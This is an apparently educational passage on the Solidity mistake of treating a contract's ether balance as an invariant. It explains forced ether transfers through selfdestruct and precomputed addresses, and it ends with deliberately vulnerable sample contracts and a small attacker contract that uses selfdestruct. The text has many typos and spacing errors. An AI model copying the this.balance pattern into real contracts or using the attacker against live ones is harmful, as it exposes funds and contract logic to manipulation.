
A common defensive programming technique that is useful in enforcingcorrect state transitions or validating operations is invariant checking. This technique involves defining a set of invariants (metrics or parameters that should not change)

operation(s) . This is typically good design , provided the invariants being checked are in fact invariants. One example of an invariant isthe totalSupply of a fixed-issuance ERC20 token. As no function should modify this invariant, one could add a check to the transfer function that ensures the totalSupply remains  unmodified , to guarantee the function is working as expected .


Inparticular,there is one apparent invariant that it may be tempting to use but that can in fact be manipulated by external users (regardless of the rules put in place in the smart contract). This is the current ether stored in the contract. Often w h e n developers first learn Solidity they have the misconception that a contract can only accept or obtain ether via payable functions. This misconception can lead to contracts that have false assumptions about the ether balance within them, which can lead to a range of vulnerabilities. The smoking gun for this vulnerability is the (incorrect)use of this.balance.

 There are two ways in which ether can(forcibly )be sentto a contract without using a payable function or executing any code on the contract:

 - Self-destruct/suicide:
        
        Any con tract is able to implement the self destruct function ,which removes allbytecode from the contract address and sends allether stored there to the parameter-specified address. If this specified address is also a contract, n o functions (including the fallback) get called. Therefore, the selfdestruct function can be used to forcibly send ether to any contract regardless of any code that may existinthecontract,evencontractswithno payable functions. This means any attacker can create a contract with a
        self destruct function , send ether to it, call self destruct (target) and force ether to be sent to a target contract.

 - Pre-sent ether
       Another way to get ether in to a contract is to preload the contract address with ether. Contract addresses are deterministic—in fact, the address is
       calculated from te kecca-256 (commonly synony with SHA-3) hash of
       the address creating the contract and the transaction nonce that creates the contract.Specifically,itisoftheformaddress = sha3(rlp.encode([account_address,transaction_nonce])) 
       This mean s anyone can calculate what a contract ’s address will be before it is created and send ether to that address.When the contract is createdit will have a nonzero ether balance.

       ```
       contract VulnerableRequireCheck
        {
            
            bool youWin = false;

            function onlyNonZeroBalance(){
                require(this.balance > 0);
                youWin = true;
            }
            
            function () payable{
                revert();
            }
        }

       contract VulnerableGetBalance
        {
            function getBalance() view returns (uint){
                return this.balance;
            }
            
            function () payable{
                revert();
            }
        }

       //calls selfdestruct to forcibly send ether to any contract above
       contract Attacker{
            address toTransfer;

            function getBalance() view returns (uint){
                return this.balance;
            }
            
            function payToContract() payable{
            }
            
            function ForceTransfer(address _address){
                toTransfer = _address;
            }
            
            function kill(){
                selfdestruct(toTransfer);
            }
        }
         
       ```
